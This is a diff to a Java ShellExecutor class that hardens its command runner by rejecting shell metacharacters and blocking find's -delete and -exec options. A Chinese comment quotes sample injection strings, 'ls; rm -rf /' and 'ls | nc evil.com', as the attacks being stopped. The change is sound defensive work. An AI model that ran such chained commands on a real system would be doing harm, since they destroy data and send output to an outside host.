@@ -56,10 +56,18 @@ public final class ShellExecutor {
         return sb.toString();
     }
 
-    // 跑一条命令，带超时。只接受白名单里的命令。
+    // 跑一条命令，带超时。只接受白名单里的命令，且禁止元字符拼接（; & | ` $ < > 等）
     public String exec(String command, int timeoutMs) {
         if (command == null || command.trim().isEmpty()) return "empty command";
         String trimmed = command.trim();
+
+        // 禁止 shell 元字符：防止 "ls; rm -rf /" 或 "ls | nc evil.com" 绕过
+        if (trimmed.contains(";") || trimmed.contains("&") || trimmed.contains("|")
+                || trimmed.contains("`") || trimmed.contains("$(") || trimmed.contains("(")
+                || trimmed.contains(")") || trimmed.contains("<") || trimmed.contains(">")
+                || trimmed.contains("\n") || trimmed.contains("\r")) {
+            return "blocked: command contains shell metacharacters";
+        }
 
         // 取第一个 token 做白名单校验
         int sp = trimmed.indexOf(' ');
@@ -67,6 +75,11 @@ public final class ShellExecutor {
         cmd0 = cmd0.replaceAll("[^a-z]", "").toLowerCase();
         if (!ALLOWED.contains(cmd0)) {
             return "blocked: " + cmd0 + " not in allowlist";
+        }
+        // find 的 -delete/-exec/-execdir/-ok 能任意删文件/执行代码，禁掉
+        if ("find".equals(cmd0) && (trimmed.contains("-delete") || trimmed.contains("-exec")
+                || trimmed.contains("-execdir") || trimmed.contains("-ok"))) {
+            return "blocked: find with -delete/-exec is not allowed";
         }
 
         Process proc;
